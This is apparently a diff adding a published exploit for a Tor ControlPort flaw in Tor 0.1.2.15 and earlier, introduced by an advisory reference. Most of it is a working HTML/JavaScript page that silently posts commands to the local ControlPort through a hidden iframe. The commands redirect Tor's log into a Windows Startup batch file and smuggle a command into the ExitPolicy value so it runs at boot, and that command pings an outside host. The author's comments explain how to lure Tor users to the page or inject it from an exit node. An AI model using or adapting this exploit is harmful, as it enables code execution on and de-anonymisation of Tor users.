@@ -1,0 +1,76 @@
+source: http://www.securityfocus.com/bid/25188/info
+
+Tor is prone to an unauthorized-access vulnerability due to a design error when handling multiple connections to the ControlPort.
+
+An attacker can exploit this issue to reconfigure Tor and significantly weaken the anonymity provided by the software.
+
+Tor 0.1.2.15 is confirmed vulnerable; previous versions may also be affected. 
+
+<!-- 
+
+Tor < 0.1.2.16 with ControlPort enabled ( not default )
+Exploit for Tor ControlPort "torrc" Rewrite Vulnerability 
+http://secunia.com/advisories/26301
+
+Rewrites the torrc to log to a different location: C:\Documents and 
+Settings\All Users\Start Menu\Programs\Startup\t.bat
+Also enables debug logging, and an erroneous ExitPolicy looking 
+something like this: reject*:1337\&#039;&&#039; calc.exe  this will output:
+[debug] parse_addr_policy(): Adding new entry &#039;reject*:1337&#039;& calc.exe 
+to the debug log -> t.bat which will run calc.exe on next boot.
+
+This is not very silent though, t.bat will contain something like 45 
+rows of crap which the user will see in about 1 sec, drop me a mail if 
+you have a better way.
+
+Either have a TOR user visit this HTML or inject it into her traffic 
+when you&#039;re a TOR exit.
+If you inject, just replace </HEAD> with everything in <HEAD> + </HEAD> 
+( that&#039;s why I tried to fit everything inside <HEAD />), and fix 
+Content-Length
+
+// elgCrew _AT_ safe-mail.net
+-->
+
+<html>
+<head>
+<script language="javascript">
+
+window.onload = function()
+{
+
+	cmd = &#039;cls & echo off & ping -l 1329 my.tcpdump.co -n 1 -w 1 > 
+NUL & del t.bat > NUL & exit&#039;;
+	inject = &#039;\r\nAUTHENTICATE\r\nSETCONF Log=\"debug-debug file 
+C:\\\\Documents and Settings\\\\All Users\\\\Start 
+Menu\\\\Programs\\\\Startup\\\\t.bat\"\r\nSAVECONF\r\nSIGNAL 
+RELOAD\r\nSETCONF ExitPolicy=\"reject*:1337\\\&#039;&&#039; + cmd + 
+&#039;&\"\r\nSETCONF Log=\"info file c:\\\\tor.txt\"\r\nSAVECONF\r\nSIGNAL 
+RELOAD\r\n&#039;;
+	
+	form51.area51.value = inject;
+	document.form51.submit();
+}
+</script>
+
+<form target="hiddenframe" name="form51" 
+action="http://localhost.mil.se:9051" method=POST 
+enctype="multipart/form-data">
+<input type=hidden name=area51>
+</form>
+<iframe width=0 height=0 frameborder=0 name="hiddenframe"></iframe>
+</head>
+
+<body>
+<pre>
+  ----
+ | y0! |
+  ----
+          \  \_\_    _/_/
+           \     (oo)\_______
+                 |_|\        )*
+                     ||----w |
+                     ||     ||
+</pre>
+</body>
+</html>
